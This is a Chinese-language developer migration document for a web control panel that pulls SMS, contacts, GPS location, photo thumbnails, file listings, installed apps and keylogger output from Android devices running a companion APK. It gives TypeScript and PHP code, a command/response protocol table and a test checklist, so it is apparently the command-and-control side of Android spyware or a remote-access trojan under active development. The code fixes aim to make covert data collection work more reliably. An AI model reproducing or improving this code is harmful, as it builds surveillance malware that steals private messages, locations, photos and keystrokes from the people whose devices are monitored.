# 设备控制功能迁移文档

## 概述

本文档记录了从旧版 Node.js WebSocket 系统迁移到新版 Laravel 12 + Vue 3 + PHP Swoole 架构的设备控制功能实现细节。

## 迁移日期

2026-03-12

## 功能范围

- 短信获取
- 通讯录获取
- 位置获取
- 相册获取（含缩略图加载）
- 文件管理
- 应用列表
- 键盘记录

## 关键变更

### 1. 超时处理机制

**实现位置**: `app/resources/ts/composables/useDeviceData.ts`

所有数据请求统一添加 5 秒超时处理：

```typescript
const REQUEST_TIMEOUT = 5000;

const fetchSms = () => {
    loading.value.sms = true;
    setTimeout(() => {
        if (loading.value.sms) {
            loading.value.sms = false;
            messageApi?.warning('获取短信超时，设备可能未授予权限或离线');
        }
    }, REQUEST_TIMEOUT);
    return sendDataRequest({ subc: 'SMS' });
};
```

**适用功能**:
- 短信 (fetchSms)
- 联系人 (fetchContacts)
- 文件 (fetchFiles)
- 应用 (fetchApps)
- 键盘记录 (fetchKeylog)
- 位置 (Control.vue)
- 相册 (Control.vue)

### 2. 数据解析修复

#### 联系人数据解析

**问题**: 原实现使用 `JSON.parse(data)` 直接解析整个字符串，但数据格式为逐行 JSON。

**修复**: 逐行解析

```typescript
const parseContactsData = (data: string): Contact[] => {
    const lines = data.trim().split('\n');
    return lines
        .map(line => {
            try {
                return JSON.parse(line.trim());
            } catch {
                return null;
            }
        })
        .filter((contact): contact is Contact => contact !== null);
};
```

#### 文件列表数据解析

**问题**: 字段索引错误，导致文件名、大小、路径解析错误。

**数据格式**:
```
[0][>A<][1][>A<][2:name][>A<][3:size][>A<][4:path][>A<][5:date][>A<][6:date][>A<][7:isDir]
```

**修复**:
```typescript
const parseFilesData = (data: string): FileItem[] => {
    const lines = data.trim().split('\n');
    return lines.map(line => {
        const parts = line.split('[>A<]');
        return {
            id: parts[0],
            name: parts[2],        // 修正：原为 parts[1]
            size: parseInt(parts[3]) || 0,  // 修正：原为 parts[2]
            path: parts[4],        // 修正：原为 parts[3]
            isDirectory: parts[7] === '1',  // 修正：原为 parts[4]
            created_at: parts[5] || '',
        };
    });
};
```

### 3. 位置功能重构

**变更**: 将位置状态管理从 `Control.vue` 迁移到 `useDeviceData.ts`

**原因**: 统一数据管理模式，简化组件逻辑

**实现**:
```typescript
// useDeviceData.ts
const location = ref<DeviceLocation | null>(null);

const fetchLocation = () => {
    loading.value.location = true;
    return sendDataRequest({ subc: 'getlocation' });
};

const parseLocationData = (data: string): DeviceLocation => {
    const [latitude, longitude] = data.split(',').map(Number);
    return { latitude, longitude };
};
```

### 4. 相册功能完整实现

#### 协议差异分析

**旧项目实现**:
- 使用 `files` 命令获取文件列表
- 路径: `/sdcard/DCIM/Camera/`
- 缩略图: 通过 `viewfile` 命令请求，设备返回 `thumb` 消息

**新项目错误实现**:
- 错误添加了 `getgallery` 命令（设备端不支持）
- 缺少缩略图加载机制

#### 修复方案

**1. 删除错误的 getgallery 处理**

文件: `app/app/WebSocket/Handlers/PanelSendHandler.php`

```php
// 删除以下方法
private function handleGetGallery(array $data, int $fd): void
{
    // ...
}
```

**2. 复用文件列表获取相册**

文件: `app/resources/ts/Pages/Devices/Control.vue`

```typescript
case 'files': {
    const files = parseFilesData(message.data);
    
    // 过滤图片文件
    const imageExtensions = ['.jpg', '.jpeg', '.png', '.gif', '.webp', '.bmp'];
    const imageFiles = files.filter(file => 
        !file.isDirectory && 
        imageExtensions.some(ext => file.name.toLowerCase().endsWith(ext))
    );
    
    // 构建相册数据
    galleryImages.value = imageFiles.map(file => ({
        id: file.id,
        path: file.path,
        thumbnail: '',  // 初始为空，等待 thumb 消息更新
        name: file.name,
        size: file.size,
        created_at: file.created_at,
    }));
    
    // 批量请求缩略图
    imageFiles.forEach(file => {
        sendMessage({
            type: 'panel_send',
            data: {
                device_id: deviceId.value,
                subc: 'viewfile',
                data: file.path,
            },
        });
    });
    
    loading.value.gallery = false;
    break;
}
```

**3. 处理缩略图响应**

```typescript
case 'thumb': {
    const [path, base64Data] = message.data.split('[>B<]');
    const imageIndex = galleryImages.value.findIndex(img => img.path === path);
    
    if (imageIndex !== -1) {
        galleryImages.value[imageIndex].thumbnail = `data:image/jpeg;base64,${base64Data}`;
    }
    break;
}
```

## 消息协议对照表

| 功能 | 前端发送 (subc) | 设备响应 (type) | 数据格式 |
|------|----------------|----------------|----------|
| 短信 | `SMS` | `sms` | 逐行 JSON |
| 通讯录 | `getcontacts` | `contacts` | 逐行 JSON |
| 位置 | `getlocation` | `location` | `latitude,longitude` |
| 文件列表 | `files` + path | `files` | `[0][>A<][1][>A<][name][>A<][size][>A<][path][>A<]...` |
| 缩略图 | `viewfile` + path | `thumb` | `path[>B<]base64data` |
| 应用列表 | `getapps` | `apps` | 逐行 JSON |
| 键盘记录 | `getkeylog` | `keylog` | 文本 |

## 已知问题

### 1. 短信/通讯录无法获取

**原因**: 设备端未返回数据

**可能原因**:
- 设备未授予权限
- APK 版本不兼容
- 设备离线

**代码层面**: 已验证协议和解析逻辑正确

### 2. 缓存机制未实现

**旧项目**: 使用 IndexedDB 缓存缩略图（数据库名：`ImageDatabase`）

**新项目**: 每次都重新请求

**影响**: 性能较差，重复加载相同图片

**优化建议**: 实现 IndexedDB 缓存层

## 测试清单

- [ ] 短信获取（需设备授权）
- [ ] 通讯录获取（需设备授权）
- [ ] 位置获取
- [ ] 相册列表加载
- [ ] 相册缩略图加载
- [ ] 文件列表获取
- [ ] 应用列表获取
- [ ] 键盘记录获取
- [ ] 超时提醒（5秒）
- [ ] Loading 状态正确恢复

## 参考文件

- `docs/migration/WEBSOCKET_CLIENT.md` - WebSocket 协议文档
- `legacy/src/api/ws/websocket-server.js` - 旧项目 WebSocket 服务器
- `docs/info.php` - 旧项目前端实现参考

## 修改文件清单

1. `app/resources/ts/composables/useDeviceData.ts`
   - 添加超时处理常量和逻辑
   - 修复联系人和文件数据解析
   - 添加位置状态管理

2. `app/resources/ts/Pages/Devices/Control.vue`
   - 添加 `thumb` 消息处理
   - 实现相册缩略图批量请求
   - 添加位置和相册超时处理
   - 删除错误的 `getgallery` 调用

3. `app/app/WebSocket/Handlers/PanelSendHandler.php`
   - 删除 `handleGetGallery` 方法

## 后续优化建议

1. **缓存机制**: 实现 IndexedDB 缓存缩略图
2. **相册分类**: 支持相机照片、图片、截图、全部
3. **缩略图压缩**: Canvas 压缩到 150px
4. **批量操作**: 优化批量请求性能
5. **错误重试**: 添加自动重试机制
